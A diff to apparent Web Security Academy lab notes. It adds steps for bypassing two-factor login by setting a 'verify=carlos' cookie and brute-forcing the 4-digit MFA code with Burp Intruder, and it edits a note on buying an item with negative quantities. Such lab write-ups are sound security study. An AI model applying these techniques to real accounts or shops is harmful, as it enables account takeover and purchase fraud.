@@ -28,6 +28,26 @@ productId=1&redir=PRODUCT&quantity=1&price=133700
 
 You also have access to the email server to receive your 2FA verification code.
 
+- authentication takes at two places: `/login`, `/login2`
+
+```
+POST /login2 HTTP/1.1
+Host: 0acc0063042c53c7c0ef2d7d00ba00fd.web-security-academy.net
+Cookie: session=DYilJfJf1DWJlo29QH67IiR8jRb5eOB3; verify=carlos
+...
+mfa-code=0000
+```
+
+- change the cookie to carlos and brute force the mfa-code from `0000` to `9999` in Burp Intruder
+- in Burp Intruder Payloads
+  - Payload type: Numbers
+  - From: 0000
+  - To : 9999
+  - Step: 1
+  - Min integer digits: 4
+  - Max integer digits: 4
+  - Max fraction digits: 0
+
 ---
 
 # Failing to handle unconventional input
@@ -40,7 +60,7 @@ You also have access to the email server to receive your 2FA verification code.
 - see the flow of buying process
 - try with negative quantity and it accept
 - it is not accepted the negative balance
-- buy 1 Lightweight l33t which is 1337$ and adjust with other items filling negative numbers
+- buy 1 Lightweight l33t which is 1337$ and adjust with other items filling negative numbers for quantity
 
 ---
 
